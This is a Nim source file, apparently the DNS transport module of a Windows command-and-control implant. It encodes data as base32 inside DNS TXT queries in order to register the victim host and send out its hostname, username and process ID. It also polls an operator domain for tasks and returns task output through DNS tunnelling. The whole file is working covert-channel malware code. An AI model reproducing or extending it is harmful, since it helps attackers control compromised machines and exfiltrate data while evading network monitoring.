## DNS TXT transport for Nim agent.
## Wire-compatible with Go transport_dns.go.
## Data encoded as lowercase base32 (RFC 4648, no padding) in DNS TXT queries.
## Register: reg.<b32-chunks>.<seq>.<total>.<agentid>.<domain>
## Beacon:   poll.<agentid>.<domain>  → TXT = tasks or "nil"
## Result:   res.<b32-chunk>.<seq>.<total>.<taskid-hex>.<agentid>.<domain>
import std/[json, strutils, strformat]
import winim/lean
import config

# Compile-time DNS constants (injected at build time)
const DNSDomain* {.strdefine.} = ""
const DNSServer* {.strdefine.} = "8.8.8.8"

# ── base32 (RFC 4648 standard alphabet, no padding, lowercase) ────────────────

const b32Alpha = "abcdefghijklmnopqrstuvwxyz234567"

proc b32Encode*(data: seq[byte]): string =
  result = ""
  var buf: uint64 = 0
  var bits = 0
  for b in data:
    buf = (buf shl 8) or uint64(b)
    inc bits, 8
    while bits >= 5:
      dec bits, 5
      result.add(b32Alpha[int((buf shr bits) and 0x1f)])
  if bits > 0:
    result.add(b32Alpha[int((buf shl (5 - bits)) and 0x1f)])

proc b32Decode*(s: string): seq[byte] =
  var buf: uint64 = 0
  var bits = 0
  for ch in s.toLowerAscii():
    let v: int =
      if ch >= 'a' and ch <= 'z': ord(ch) - ord('a')
      elif ch >= 'A' and ch <= 'Z': ord(ch) - ord('A')
      elif ch >= '2' and ch <= '7': 26 + ord(ch) - ord('2')
      else: -1
    if v < 0: continue
    buf = (buf shl 5) or uint64(v)
    inc bits, 5
    if bits >= 8:
      dec bits, 8
      result.add(byte((buf shr bits) and 0xff))

proc chunkStr(s: string; size: int): seq[string] =
  var i = 0
  while i < s.len:
    result.add(s[i ..< min(i + size, s.len)])
    inc i, size

# ── FNV-1a 64-bit for deterministic agent ID ──────────────────────────────────

proc fnv64(s: string): uint64 =
  result = 14695981039346656037'u64
  for c in s:
    result = result xor uint64(ord(c))
    result = result * 1099511628211'u64

# ── WinSock2 UDP declarations ─────────────────────────────────────────────────

type
  WsSocket = uint   # SOCKET is UINT_PTR on 64-bit Windows

type Timeval32 {.pure.} = object
  tv_sec:  int32
  tv_usec: int32

type SockaddrIn {.pure.} = object
  sin_family: uint16
  sin_port:   uint16
  sin_addr:   uint32
  sin_zero:   array[8, byte]

const
  WS_INVALID_SOCKET = WsSocket(not 0'u)
  WS_AF_INET        = 2'i32
  WS_SOCK_DGRAM     = 2'i32
  WS_IPPROTO_UDP    = 17'i32
  WS_SOL_SOCKET     = 0xffff'i32
  WS_SO_RCVTIMEO    = 0x1006'i32

var wsaData: array[408, byte]  # sizeof(WSADATA) on x64

proc wsaStartup(ver: uint16; data: pointer): int32
  {.stdcall, dynlib: "ws2_32", importc: "WSAStartup".}
proc wsaSocket(af, typ, prot: int32): WsSocket
  {.stdcall, dynlib: "ws2_32", importc: "socket".}
proc wsaSendto(s: WsSocket; buf: pointer; len, flags: int32;
               to: pointer; tolen: int32): int32
  {.stdcall, dynlib: "ws2_32", importc: "sendto".}
proc wsaRecvfrom(s: WsSocket; buf: pointer; len, flags: int32;
                 fr: pointer; fromLen: ptr int32): int32
  {.stdcall, dynlib: "ws2_32", importc: "recvfrom".}
proc wsaSetsockopt(s: WsSocket; level, optname: int32;
                   optval: pointer; optlen: int32): int32
  {.stdcall, dynlib: "ws2_32", importc: "setsockopt".}
proc wsaClosesocket(s: WsSocket): int32
  {.stdcall, dynlib: "ws2_32", importc: "closesocket".}
proc wsaInetAddr(cp: cstring): uint32
  {.stdcall, dynlib: "ws2_32", importc: "inet_addr".}
proc wsaHtons(n: uint16): uint16
  {.stdcall, dynlib: "ws2_32", importc: "htons".}

# ── Manual DNS TXT query ──────────────────────────────────────────────────────

proc buildDNSQuery(qname: string): seq[byte] =
  result = @[byte(0xab), 0xcd,  # transaction ID
             0x01, 0x00,         # flags: standard query, RD=1
             0x00, 0x01,         # QDCOUNT=1
             0x00, 0x00,         # ANCOUNT=0
             0x00, 0x00,         # NSCOUNT=0
             0x00, 0x00]         # ARCOUNT=0
  for label in qname.strip(chars={'.', ' '}).split('.'):
    if label.len == 0: continue
    result.add(byte(label.len))
    for c in label: result.add(byte(ord(c)))
  result.add(0x00)              # root label
  result.add(0x00); result.add(0x10)  # QTYPE = TXT (16)
  result.add(0x00); result.add(0x01)  # QCLASS = IN (1)

proc parseDNSTXTResp(buf: seq[byte]): string =
  if buf.len < 12: return ""
  var pos = 12
  while pos < buf.len:
    if buf[pos] == 0: inc pos; break
    if (buf[pos] and 0xC0) == 0xC0: inc pos, 2; break
    inc pos, int(buf[pos]) + 1
  inc pos, 4  # skip QTYPE + QCLASS
  let ancount = int(buf[6]) shl 8 or int(buf[7])
  for _ in 0..<ancount:
    if pos >= buf.len: break
    while pos < buf.len:
      if buf[pos] == 0: inc pos; break
      if (buf[pos] and 0xC0) == 0xC0: inc pos, 2; break
      inc pos, int(buf[pos]) + 1
    if pos + 10 > buf.len: break
    let rtype = int(buf[pos]) shl 8 or int(buf[pos+1])
    inc pos, 8  # type(2) + class(2) + ttl(4)
    let rdlen = int(buf[pos]) shl 8 or int(buf[pos+1])
    inc pos, 2
    if pos + rdlen > buf.len: break
    if rtype == 16 and rdlen > 1:
      let strLen = int(buf[pos])
      if strLen >= 1 and rdlen >= strLen + 1:
        return cast[string](buf[pos+1 ..< pos+1+strLen])
    inc pos, rdlen
  return ""

proc txQuery(server, qname: string): string =
  let colonIdx = server.rfind(':')
  let host = if colonIdx < 0: server else: server[0..<colonIdx]
  let port = if colonIdx < 0: 53'u16 else: uint16(parseInt(server[colonIdx+1..^1]))

  let sock = wsaSocket(WS_AF_INET, WS_SOCK_DGRAM, WS_IPPROTO_UDP)
  if sock == WS_INVALID_SOCKET: return ""
  defer: discard wsaClosesocket(sock)

  var tv = Timeval32(tv_sec: 5, tv_usec: 0)
  discard wsaSetsockopt(sock, WS_SOL_SOCKET, WS_SO_RCVTIMEO, addr tv, int32(sizeof(tv)))

  var dst = SockaddrIn(sin_family: 2'u16,
                       sin_port:   wsaHtons(port),
                       sin_addr:   wsaInetAddr(host.cstring))
  let msg = buildDNSQuery(qname)
  if wsaSendto(sock, unsafeAddr msg[0], int32(msg.len), 0,
               addr dst, int32(sizeof(dst))) < 0:
    return ""

  var buf = newSeq[byte](4096)
  var fromAddr = SockaddrIn()
  var fromLen  = int32(sizeof(fromAddr))
  let got = wsaRecvfrom(sock, addr buf[0], 4096, 0,
                        addr fromAddr, addr fromLen)
  if got <= 0: return ""
  parseDNSTXTResp(buf[0..<int(got)])

# ── helpers ───────────────────────────────────────────────────────────────────

proc getEnvStr(k, default: string): string =
  var buf = newWideCString(newString(512))
  let n = GetEnvironmentVariableW(newWideCString(k), buf, 512)
  if n == 0: return default
  $buf

proc exeName*(): string =
  var buf = newWideCString(newString(MAX_PATH))
  let n = GetModuleFileNameW(0, buf, MAX_PATH)
  if n == 0: return "agent.exe"
  let full = $buf
  let i = max(full.rfind('\\'), full.rfind('/'))
  if i < 0: full else: full[i+1..^1]

# ── transport ─────────────────────────────────────────────────────────────────

type
  AgentTransport* = object
    domain*:  string
    server*:  string
    agentId*: string
    aesKey*:  seq[byte]

  TaskWire* = object
    id*:      int64
    typ*:     string
    args*:    string
    payload*: seq[byte]

proc newTransport*(): AgentTransport =
  discard wsaStartup(0x0202, addr wsaData[0])
  result.domain = DNSDomain.toLowerAscii().strip(chars = {'.', ' '})
  result.server = DNSServer
  if ':' notin result.server:
    result.server &= ":53"

proc query(t: AgentTransport; qname: string): string =
  txQuery(t.server, qname)

proc register*(t: var AgentTransport): bool =
  let hostname = getEnvStr("COMPUTERNAME", "UNKNOWN")
  let pid      = int(GetCurrentProcessId())
  t.agentId    = fmt"{fnv64(hostname & $pid):016x}"

  let payload = %*{
    "hostname": hostname,
    "username": getEnvStr("USERNAME", "UNKNOWN"),
    "os":       "windows/amd64",
    "pid":      pid,
    "aes_key":  ""
  }
  let encoded = b32Encode(cast[seq[byte]]($payload))
  let chunks  = chunkStr(encoded, 48)
  let total   = chunks.len
  for seqi, chunk in chunks:
    let qname = "reg." & chunk & "." & $seqi & "." & $total & "." & t.agentId & "." & t.domain
    let resp  = t.query(qname)
    if resp.len == 0 or not resp.startsWith("ok"): return false
  return true

proc beacon*(t: var AgentTransport): seq[TaskWire] =
  let resp = t.query("poll." & t.agentId & "." & t.domain)
  if resp.len == 0 or resp == "nil": return @[]

  var encoded: string
  if resp.startsWith("more:"):
    let total = parseInt(resp[5..^1])
    var parts = newSeq[string](total)
    for i in 0..<total:
      parts[i] = t.query("chunk." & $i & "." & t.agentId & "." & t.domain).replace("chunk:", "")
    encoded = parts.join("")
  else:
    encoded = resp

  let decoded = b32Decode(encoded)
  if decoded.len == 0: return @[]
  try:
    let j    = parseJson(cast[string](decoded))
    var task = TaskWire(id:   j["id"].getBiggestInt(),
                        typ:  j["type"].getStr(),
                        args: j{"args"}.getStr(""))
    result.add(task)
  except: discard

proc sendResultAdmin*(t: var AgentTransport; taskId: int64;
                      output, errStr: string; isAdmin: bool) =
  let payload = %*{"task_id": taskId, "output": output, "error": errStr}
  let encoded = b32Encode(cast[seq[byte]]($payload))
  let chunks  = chunkStr(encoded, 48)
  let total   = chunks.len
  let taskHex = fmt"{taskId:x}"
  for seqi, chunk in chunks:
    let qname = "res." & chunk & "." & $seqi & "." & $total & "." & taskHex & "." & t.agentId & "." & t.domain
    discard t.query(qname)

proc sendResult*(t: var AgentTransport; taskId: int64; output, errStr: string) =
  t.sendResultAdmin(taskId, output, errStr, false)

proc uploadFile*(t: var AgentTransport; taskId: int64;
                 filename: string; data: seq[byte]) =
  t.sendResult(taskId, "file:" & filename & ":size=" & $data.len,
               "upload-not-supported-over-dns")

proc downloadFile*(t: var AgentTransport; filename: string): seq[byte] =
  return @[]
